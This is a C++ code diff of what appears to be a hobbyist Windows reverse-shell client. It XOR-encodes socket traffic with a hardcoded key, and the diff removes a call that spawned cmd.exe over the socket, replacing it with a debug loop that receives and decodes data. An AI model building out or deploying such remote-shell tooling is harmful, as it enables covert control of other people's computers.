@@ -22,14 +22,14 @@ wstring ConvertUtf8ToWidee(const string& str)
 }
 
 
-wstring XORencryption(wstring data) //Do not use strlen on XOREncryption
+string XORencryption(string data) //Do not use strlen on XOREncryption
 {
     //        print("i: ",i,"current: ",current, " | current key: ", current_key, " | char xor",char_xor )
 
-    wstring result;
-    wstring char_xor;
+    string result;
+    string char_xor;
     //wstring key = L"" XOR_KEY;
-    wstring key = L"ba38fab1b592c8f4b1fbbe8d915ee009a840efe504e3a833d0d8afae3b9ea148c859a8e8441877a0721d54f92fccbf12241007253cd6468194484e310798c01d8874dab3c4daa2c3ad612b7ba79ddc5b7ae80de0190f6842d6540da4b5b66c08987f8a15b3f5b80c588e42d1b6c9f149e99cc3c145cd31edaa25b095a6d509df93743a4861929533582d418aa3a766de439e938b7302001e17a6b4691480c4520a5e3a3b31012a003f7ced0ae59936953356f04b92b0e81b9f5b3703130d98118df5bdcc57e0f632b01b443a02bd23fc2f83ca27f9be70cdc657e8f4d74095f5dd88a4c88519db28a45e2e9e4ff714715d6ba53f1a88579f7f47e421b4a3526d40ead58521fbc0b56d373dce956fbb5a7d85f44e24085289b02e4782c3ed1154277fdc56467c1fe08a89d43e96ad2e73f4246c4e9238d660cf85dbc034543a13830dafb383ba61999de8eaee11ac9fa69b170461b241be69e0213e2a3f860edb29d3a1baf0f8a31b577d5893f13ca7377f0aa1bc433ff212e1e7c11cb2ad210df750cdcb6b3202655b215f7abca0f7f85803444e4fb06766a668975e7aa216abc8fdcda3bc7e2797a819b4a1eeccba75bdb49e2e0832ab171c73911362f1384480ca3152399c52b14deefc20a7ddb5e7cc9379688b37af6a42d54a32a85c20b86c4aa86361757e34e66ab0c13e7270788dc097d3db859b0474e4305dc5ffb51d";
+    string key = "ba38fab1b592c8f4b1fbbe8d915ee009a840efe504e3a833d0d8afae3b9ea148c859a8e8441877a0721d54f92fccbf12241007253cd6468194484e310798c01d8874dab3c4daa2c3ad612b7ba79ddc5b7ae80de0190f6842d6540da4b5b66c08987f8a15b3f5b80c588e42d1b6c9f149e99cc3c145cd31edaa25b095a6d509df93743a4861929533582d418aa3a766de439e938b7302001e17a6b4691480c4520a5e3a3b31012a003f7ced0ae59936953356f04b92b0e81b9f5b3703130d98118df5bdcc57e0f632b01b443a02bd23fc2f83ca27f9be70cdc657e8f4d74095f5dd88a4c88519db28a45e2e9e4ff714715d6ba53f1a88579f7f47e421b4a3526d40ead58521fbc0b56d373dce956fbb5a7d85f44e24085289b02e4782c3ed1154277fdc56467c1fe08a89d43e96ad2e73f4246c4e9238d660cf85dbc034543a13830dafb383ba61999de8eaee11ac9fa69b170461b241be69e0213e2a3f860edb29d3a1baf0f8a31b577d5893f13ca7377f0aa1bc433ff212e1e7c11cb2ad210df750cdcb6b3202655b215f7abca0f7f85803444e4fb06766a668975e7aa216abc8fdcda3bc7e2797a819b4a1eeccba75bdb49e2e0832ab171c73911362f1384480ca3152399c52b14deefc20a7ddb5e7cc9379688b37af6a42d54a32a85c20b86c4aa86361757e34e66ab0c13e7270788dc097d3db859b0474e4305dc5ffb51d";
     //wstring key = L"ba38fab1b592c8f4b1fbbe8d915ee009a84";
     if(data.empty())
     {
@@ -38,12 +38,21 @@ wstring XORencryption(wstring data) //Do not use strlen on XOREncryption
 
     for(int i=0;i<data.size(); i++)
     {
-        char_xor = data.at(i) ^ key[i % key.size()];
-        wcout << "i: " << i << " curent: " << data.at(i) << " current key: " << key[i % key.size()] << " char xor: " << char_xor << endl;
+        try
+        {
+            char_xor = data.at(i) ^ key[i % key.size()];
+            //cout <<"data I : " <<  data.at(i) << endl;
+            //cout <<"key: " <<  key[i % key.size()] << "\n\n" << endl;
+            //cout << "char xor: " << char_xor << endl;
+        }
+        catch(const exception&)
+        {
+            char_xor = data.at(i);
+        }
+
+       // wcout << "i: " << i << " curent: " << data.at(i) << " current key: " << key[i % key.size()] << " char xor: " << char_xor << endl;
         result += char_xor;   
     }
-
-    wcout << result << endl;
     return result;
 }
 
@@ -55,12 +64,36 @@ SOCKET testtt(SOCKET &sock)
     return sock;
 }
 int main()
-{
+{   
+    char test[] = "laura c'est la plus belle !";
+    cout << test << endl;
 
-    //wstring test = L"Ελληνικά";
+    char test1[] = "laura c'est la \0plus belle !";
+    cout << test1 << endl;
+    cout << strlen(test1) << endl;
+
+    string test2 =  "laura c'est la \0plus belle !";
+    cout << test2 << endl;
+    cout << test2.length() << endl;
+
+    /*
+    cout << GetConsoleOutputCP() << endl;
+    UINT mycp = GetConsoleOutputCP();
+    
+    cout << "set !" << SetConsoleOutputCP(CP_UTF8) << endl;
+ 
+    cout << GetConsoleOutputCP() << endl;
+    
+    cout << "restore :" << SetConsoleOutputCP(mycp) << endl;
+    cout << GetConsoleOutputCP() << endl;
+    */
+
+    //wstring test = L"Ελληνικά";   
     //wcout << test.length() << endl;
-    SetConsoleOutputCP(CP_UTF8);
+    //SetConsoleOutputCP(CP_UTF8);
     //SetConsoleCP(CP_UTF8);
+
+
     WSADATA WSAData; 
     
     SOCKET sock;
@@ -84,24 +117,35 @@ int main()
         //Whait...;  
     } 
 
-    CHAR buff_char[4096];
+    CHAR buff_char[4096] = {0};
     WCHAR buff_wchar[4096];
 
     string command;
     wstring w_cmd;
+
     vector<string> result;
 
 
     int stat,len_MultiByteToWideChar;
+   // SetConsoleOutputCP(CP_UTF8); 
+    //_setmode(_fileno(stdout), 0x00020000);  
+   // _setmode(_fileno(stdin), 0x00020000);
+    int cmpt = 0;
+    while (true)
+    {
+        
+        int lenrecv = recv(sock, buff_char, sizeof(buff_char), 0);
+        
+        cout << "size: " << strlen(buff_char) << endl;
+        cout << buff_char << endl;
+        cout << "len recv: " << lenrecv << endl;
+        command.append(buff_char, lenrecv);
+        cout << XORencryption(command) << endl;
+        if(cmpt == 3){break;}
+        cmpt++;
 
-    vector <string> utf8exec;
-
-    _setmode(_fileno(stdout), 0x00020000); //Si cette fonction est called alors il est impossible d'utilisee cout
-
-    WCHAR testt[] = L"cmd.exe";
-    Exec().spawnSHELL(sock, testt);
-    wcout << "finsish" << endl;
-    
+        command.erase();
+    }
     return 0;
 }
 
